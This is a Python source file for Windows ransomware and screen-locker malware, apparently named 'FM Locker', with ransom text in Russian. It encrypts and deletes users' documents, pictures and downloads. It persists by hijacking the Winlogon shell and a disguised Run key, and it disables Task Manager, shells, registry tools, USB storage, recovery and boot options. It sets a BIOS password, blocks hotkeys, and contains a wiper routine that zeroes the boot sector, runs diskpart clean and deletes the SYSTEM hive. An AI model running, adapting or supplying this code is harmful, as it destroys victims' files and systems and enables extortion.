import tkinter
import os
import sys
from tkinter import messagebox
import shutil
import threading
import ctypes
import winreg
import base64
import winsound
save_mod = False

import time
import subprocess

art1 = r"""
⠀⠀⣿⠲⠤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣸⡏⠀⠀⠀⠉⠳⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⠀⠀⠀⠀⠀⠀⠀⠉⠲⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢰⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⣄⠀⠀⠀⡰⠋⢙⣿⣦⡀⠀⠀⠀⠀⠀
⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣙⣦⣮⣤⡀⣸⣿⣿⣿⣆⠀⠀⠀⠀
⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⠀⣿⢟⣫⠟⠋⠀⠀⠀⠀
⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣷⣷⣿⡁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⢸⣿⣿⣧⣿⣿⣆⠙⢆⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⣿⣤⣿⣿⣿⡟⠹⣿⣿⣿⣿⣷⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣧⣴⣿⣿⣿⣿⠏⢧⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠈⢳⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡏⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⢳
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠸⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⢠⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠃⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣼⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠛⠻⠿⣿⣿⣿⡿⠿⠿⠿⠿⠿⢿⣿⣿⠏⠀⠀⠀"""

pas = ''

message = f'''Все ваши файлы были зашифрованы
Биос, среда восстановления и безопасный режим заблокированы.
Введите код разблокировки'''

can_check = True # Don't touch, for check password




try:
    import keyboard
    from cryptography.fernet import Fernet
except Exception:
    rs = subprocess.run('install.bat', shell=True, capture_output=True, text=True, timeout=60)
    print(rs.returncode)
    sys.exit(0)

import os
import sys
import shutil
import winreg
import hashlib

try:
    with open('count.r', 'r') as f:
        counts = int(f.read().split('\n')[0])
except Exception:
    counts = 3

password = b'JHQiqKQdnqo71_xnaqlopAlsqKwoe_1j'
KEY = password
CIPHER = Fernet(base64.urlsafe_b64encode(KEY))

FOLDERS = [
    os.path.join(os.environ['USERPROFILE'], 'Desktop'),
    os.path.join(os.environ['USERPROFILE'], 'Documents'),
    os.path.join(os.environ['USERPROFILE'], 'Pictures'),
    os.path.join(os.environ['USERPROFILE'], 'Downloads'),
]

EXTS = ['.txt', '.pdf', '.jpg', '.png', '.docx', '.mp4', '.zip', '.exe']

def get_base(file_name: str):
    if getattr(sys, 'frozen', False):
        base_path = sys._MEIPASS # type: ignore[attr-defined]
    else:
        base_path = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(base_path, file_name)


appdata = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows')
os.makedirs(appdata, exist_ok=True)
sound_path = get_base('sound1.wav')
self_name = 'main.exe' # переменная должно соответствовать настоящему имени программы


self_copy = os.path.join(appdata, self_name)
sound_copy = os.path.join(appdata, sound_path)

try:
    shutil.copy(sys.executable, self_copy)
except Exception:
    pass

try:
    shutil.copy(sound_path, sound_copy)
except Exception:
    pass


launch = self_copy

def encrypt_files(): 
    """Encrypting files"""
    for folder in FOLDERS:
        for root, dirs, files in os.walk(folder):
            for file in files:
                if any(file.endswith(ext) for ext in EXTS):
                    path = os.path.join(root, file)
                    try:
                        with open(path, 'rb') as f:
                            data = f.read()
                        encrypted = CIPHER.encrypt(data)
                        with open(path + '.locked', 'wb') as f:
                            f.write(encrypted)
                        os.remove(path)
                    except Exception:
                        pass

def decrypt_files():
    """Decrypting files"""
    for folder in FOLDERS:
        for root, dirs, files in os.walk(folder):
            for file in files:
                if file.endswith('.locked'):
                    path = os.path.join(root, file)
                    try:
                        with open(path, 'rb') as f:
                            data = f.read()
                        decrypted = CIPHER.decrypt(data)
                        original = path.replace('.locked', '')
                        with open(original, 'wb') as f:
                            f.write(decrypted)
                        os.remove(path)
                    except Exception:
                        pass

def block_cmd():
    """blocking cmd"""
    for hive, path in [
        (winreg.HKEY_CURRENT_USER, r"Software\Policies\Microsoft\Windows\System"),
        (winreg.HKEY_LOCAL_MACHINE, r"Software\Policies\Microsoft\Windows\System"),
    ]:
        try:
            key = winreg.CreateKey(hive, path)
            winreg.SetValueEx(key, "DisableCMD", 0, winreg.REG_DWORD, 2)
            winreg.CloseKey(key)
        except:
            pass
    
    exes = ['cmd.exe', 'powershell.exe', 'wt.exe', 'bash.exe', 'regedit.exe', 'msconfig.exe']
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 
                                r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun")
        for i, exe in enumerate(exes, 1):
            winreg.SetValueEx(key, str(i), 0, winreg.REG_SZ, exe)
        winreg.CloseKey(key)
        
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 
                                r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")
        winreg.SetValueEx(key, "DisallowRun", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except:
        pass
    
    for exe in exes:
        try:
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, 
                                    rf"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{exe}")
            winreg.SetValueEx(key, "Debugger", 0, winreg.REG_SZ, "rundll32.exe")
            winreg.CloseKey(key)
        except:
            pass



def killWindows():
    """Killing windows (in develope, maybe not work)"""
    try:
        with open(r'\\.\PhysicalDrive0', 'wb') as disk:
            disk.write(b'\x00' * 512)
    except Exception:
        pass
    try:
        os.system('(echo select disk 0 & echo clean & echo exit) | diskpart')
        
        os.system('del /f /q C:\\Windows\\System32\\config\\SYSTEM 2>NUL')
    except Exception:
        pass

    for folder in FOLDERS:
        for root, dirs, files in os.walk(folder):
            for file in files:
                path = os.path.join(root, file)
                try:
                    os.remove(path)
                except Exception:
                    pass

    
    os.system('shutdown /r /t 0 /f')

def setup():
    """setup"""
    if not os.path.exists(self_copy):
        shutil.copy(sys.executable, self_copy)

    if not os.path.exists(sound_copy):
        shutil.copy(sound_path, sound_copy)
    
    subkey = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, subkey, 0, winreg.KEY_ALL_ACCESS)
    winreg.SetValueEx(key, "Shell", 0, winreg.REG_SZ, self_copy)
    winreg.CloseKey(key)

    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "PowerShel1", 0, winreg.REG_SZ, launch)
    winreg.CloseKey(key)


    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")
    winreg.SetValueEx(key, "NoDesktop", 0, winreg.REG_DWORD, 1)
    winreg.SetValueEx(key, "NoTaskbar", 0, winreg.REG_DWORD, 1)
    winreg.CloseKey(key)

    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
    winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
    winreg.CloseKey(key)

    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\USBSTOR", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "Start", 0, winreg.REG_DWORD, 4)
    winreg.CloseKey(key)

    key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\UsbHub")
    winreg.SetValueEx(key, "Start", 0, winreg.REG_DWORD, 4)
    winreg.CloseKey(key)

    block_cmd()
    
    os.system("wmic bios set password=pass")

    os.system("bcdedit /set {default} bootmenupolicy legacy")
    os.system("bcdedit /set {default} recoveryenabled No")
    os.system("bcdedit /set {default} advancedoptions No")
    os.system('bcdedit /set {default} usefirmwarepcisettings No >nul 2>&1')
    os.system("reagentc /disable >nul 2>&1")

    os.system('takeown /f "C:\\Recovery" /r /d y >nul 2>&1')
    os.system('icacls "C:\\Recovery" /grant Everyone:F /t >nul 2>&1')
    os.system('rd /s /q "C:\\Recovery" 2>NUL')
    

    os.system('bcdedit /set {default} recoveryenabled No >nul 2>&1')
    os.system('bcdedit /set {current} recoveryenabled No >nul 2>&1')

    encrypt_files()

    with open('count.r', 'w') as f1:
        f1.write('3')
        
    time.sleep(2)
    os.system('taskkill /f /im explorer.exe 2>NUL')
    os.system('shutdown /r /t 0')

# Run only with admin
if sys.executable != self_copy:
    if ctypes.windll.shell32.IsUserAnAdmin():
        setup()
    else:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            result = ctypes.windll.shell32.ShellExecuteW(None, 'runas', sys.executable, "".join([f'"{arg}"' for arg in sys.argv]), None, 1)
            if result > 32:
                print('Restarting...')
                sys.exit(0)
            else:
                sys.exit(0)
        
def block_keyboard():
    """blocking hotkeys"""
    keyboard.block_key('win')
    keyboard.block_key('ctrl')
    keyboard.block_key('alt')
    keyboard.block_key('shift')
    keyboard.block_key('f4')
    keyboard.block_key('tab')
    keyboard.block_key('esc')

def x():
    pass

def switch():
    """For run animation"""
    root.config(bg='red')
    label1.config(bg='red')
    root.after(800, hide1)

def hide1():
    """For run animation"""
    label1.place_forget()
    root.config(bg='black')
    root.after(1200, hide2)

def hide2():
    """For run animation"""
    root.config(bg='blue')
    text.place(relx=0.5, rely=0.4, anchor='center')
    entry.place(relx=0.5, rely=0.5, anchor='center', width=200)
    button1.place(relx=0.5, rely=0.6, anchor='center')

def unlock():
    """Unlock windows"""
    messagebox.showinfo('FM Locker', "Для разблокировки windows необходимо выдать права администратора")
    if ctypes.windll.shell32.IsUserAnAdmin():
        pass
    else:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            result = ctypes.windll.shell32.ShellExecuteW(None, 'runas', sys.executable, "".join([f'"{arg}"' for arg in sys.argv]), None, 1)
            if result > 32:
                sys.exit(0)
            else:
                messagebox.showinfo('FM Locker', "При повторном включении винлокера - заново введите пароль\nПосле чего дождитесь восстановления компьютера, не в коем случае не выключайте его.\nПосле восстановления высветится уведомление")
                sys.exit(0)
    subkey = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, subkey, 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(key, "Shell", 0, winreg.REG_SZ, "explorer.exe")
        winreg.CloseKey(key)
    except Exception as e:
        messagebox.showerror("Error!", str(e))

    os.system("wmic bios set password=")
    
    os.system("bcdedit /set {default} bootmenupolicy legacy")
    os.system("bcdedit /set {default} recoveryenabled True")
    os.system("bcdedit /set {default} advancedoptions True")
    os.system('bcdedit /set {default} usefirmwarepcisettings True >nul 2>&1')
    os.system("reagentc /enable >nul 2>&1")

    

    try:
        os.system('start explorer.exe')
    except Exception:
        pass
    
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\USBSTOR", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Start", 0, winreg.REG_DWORD, 3)
        winreg.CloseKey(key)
        
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\UsbHub", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Start", 0, winreg.REG_DWORD, 3)
        winreg.CloseKey(key)
        
        os.system('devcon enable "USB\\*" 2>NUL')
        p = sys.argv[0]
    except Exception:
        pass
    
    root.destroy()
    decrypt_files()
    messagebox.showinfo('', 'Комьютер восстановлен')

def _show_button():
    global can_check
    button1.place(relx=0.5, rely=0.6, anchor='center')
    can_check = True

def _hide_button():
    button1.place_forget()
    root.after(6000, _show_button)


def check():
    """check password"""
    global counts, can_check
    if not(can_check):
        messagebox.showerror('ERROR', "Can't check password")
        return
    
    inp = entry.get()
    if inp == pas or save_mod:
        unlock()
    else:
        counts -= 1
        if counts <= 0:
            counts = 3
            can_check = False
            _hide_button()
            messagebox.showerror('', 'Ваши попытки закончились. Подождите 60 минут')
        else:
            messagebox.showerror('FM Locker', f'Неверный пароль\nОсталось попыток: {counts}')
            
def enterChecker():
    """Checking, if enter pressed - checking password"""
    while True:
        if keyboard.is_pressed('enter'):
            check()
        time.sleep(0.01)


block_keyboard() # block hotkeys


root = tkinter.Tk()
root.config(bg='black')
label1 = tkinter.Label(text=art1, bg='black', fg='white', font='Arial 20')
text = tkinter.Label(text=message, bg='blue', fg='white', font='Arial 25')

die_window = tkinter.Tk()
die_window.config(bg='black')
die_window.withdraw()
die_window.wm_attributes('-topmost', 1)
die_window.wm_attributes('-fullscreen', 1)
die_window.wm_protocol("WM_DELETE_WINDOW", x)

entry = tkinter.Entry(fg='red', font='Arial 20')
button1 = tkinter.Button(bg='red', fg='white', text='Check password', command=lambda:check(), font='Arial 15')
label1.place(relx=0.0, rely=0.0, anchor='nw')

threading.Thread(target=enterChecker, daemon=True).start() # if enter pressed - checking password

root.wm_attributes('-topmost', 1)
root.wm_attributes('-fullscreen', 1)
root.wm_protocol("WM_DELETE_WINDOW", x) # Can't close gui
root.after(1000, switch)

winsound.PlaySound(sound_copy, winsound.SND_FILENAME | winsound.SND_ASYNC | winsound.SND_NODEFAULT) # Playing sound on start


root.mainloop()